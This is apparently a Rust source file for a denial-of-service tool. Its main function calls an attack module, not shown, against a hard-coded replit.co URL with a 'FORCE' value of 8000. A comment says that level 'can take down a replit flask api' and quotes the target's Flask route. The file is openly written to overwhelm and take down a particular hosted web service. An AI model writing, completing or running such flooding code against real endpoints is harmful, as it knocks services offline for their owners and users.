mod attack;
#[tokio::main]
async fn main() {
    attack::start().await;
}

pub static ATTACK_URL: &str = "https://SecretWindingAttributes.carghai74.repl.co/hard";

pub static FORCE: u128 = 8000;
// 8000 to can take down a replit flask api
// This is the code
// app.route('/hard')
// def hard_dos():
//   return "failure"
